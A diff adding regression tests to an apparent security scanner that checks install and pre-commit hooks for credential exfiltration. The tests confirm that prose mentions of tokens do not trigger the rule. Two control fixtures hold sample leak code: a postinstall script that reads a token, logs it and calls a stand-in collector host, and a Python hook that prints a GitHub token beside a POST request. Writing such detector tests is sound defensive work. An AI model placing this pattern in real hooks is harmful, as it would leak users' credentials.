@@ -194,6 +194,91 @@ describe("P-018: ENV-EXFIL requires the credential value to flow into a send", (
   });
 });
 
+describe("P-018 addendum (found in the v0.1.4 re-validation): prose must not taint variables or open the print branch", () => {
+  it("flowspec shape: a CLI that reads its token for API auth, copies env for subprocesses, and prints prose is not exfil", () => {
+    // Reduced from jpoley/flowspec src/flowspec_cli/__init__.py (10,565
+    // lines): the token goes into an Authorization header built by a
+    // helper, os.environ is copied for subprocess env, the docs say the
+    // word Fetch, and banner prints mention token and env in prose. The
+    // v0.1.4 print branch fired here: the word Fetch in a docstring
+    // counted as a send construct, and variable names tainted through
+    // prose mentions made a banner print look like disclosure.
+    const dir = fx({
+      ".pre-commit-config.yaml": "repos:\n- repo: local\n  hooks:\n  - id: x\n    entry: python3 tool.py\n",
+      "tool.py": [
+        '"""CLI helpers.',
+        "",
+        "We fetch release metadata. GitHub token for API requests.",
+        '"""',
+        "import os",
+        "",
+        'token = os.getenv("GITHUB_TOKEN")',
+        "env = os.environ.copy()",
+        "",
+        "def build(",
+        "    verbose=False,",
+        '    help="GitHub token for API requests",',
+        "):",
+        '    print("Run \'tool --help\' for usage information")',
+        "",
+      ].join("\n"),
+    });
+    const r = scanHooks(dir);
+    const f = r.findings.find((x) => x.source === "pre-commit");
+    assert.ok(f);
+    assert.ok(!f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
+    assert.notEqual(r.verdict, "COMPROMISED-PATTERN");
+  });
+
+  it("a variable named in a prose string is not tainted by the mention", () => {
+    const dir = fx({
+      ".pre-commit-config.yaml": "repos:\n- repo: local\n  hooks:\n  - id: x\n    entry: python3 tool.py\n",
+      "tool.py": [
+        '"""Configuration helpers. We fetch defaults. GitHub token for API requests."""',
+        "import os",
+        "",
+        'token = os.getenv("GITHUB_TOKEN")',
+        'help = "Use the token to authenticate"',
+        "print(help)",
+        "",
+      ].join("\n"),
+    });
+    const r = scanHooks(dir);
+    const f = r.findings.find((x) => x.source === "pre-commit");
+    assert.ok(f);
+    assert.ok(!f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
+  });
+
+  it("control: printing a credential variable next to a real send still fires ENV-EXFIL (JS)", () => {
+    const dir = fx({
+      "package.json": JSON.stringify({ scripts: { postinstall: "node leak.mjs" } }),
+      "leak.mjs": 'const t = process.env.MY_TOKEN;\nconsole.log("leaking", t);\nawait fetch("https://collector.example.invalid/");\n',
+    });
+    const r = scanHooks(dir);
+    const f = r.findings.find((x) => x.hook === "postinstall");
+    assert.ok(f);
+    assert.ok(f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
+  });
+
+  it("control: an f-string interpolation of a credential variable next to a real send still fires ENV-EXFIL (Python)", () => {
+    const dir = fx({
+      ".pre-commit-config.yaml": "repos:\n- repo: local\n  hooks:\n  - id: x\n    entry: python3 tool.py\n",
+      "tool.py": [
+        "import os, requests",
+        "",
+        'token = os.getenv("GITHUB_TOKEN")',
+        'print(f"debug token: {token}")',
+        'requests.post("https://api.example.com/hook", data={"a": 1})',
+        "",
+      ].join("\n"),
+    });
+    const r = scanHooks(dir);
+    const f = r.findings.find((x) => x.source === "pre-commit");
+    assert.ok(f);
+    assert.ok(f.rules.includes("ENV-EXFIL"), `rules: ${f.rules.join(",")}`);
+  });
+});
+
 describe("P-019: severe rules do not match patterns quoted inside defensive tooling", () => {
   const guardPy = [
     '"""Defensive PreToolUse guard: blocks dangerous shell commands."""',
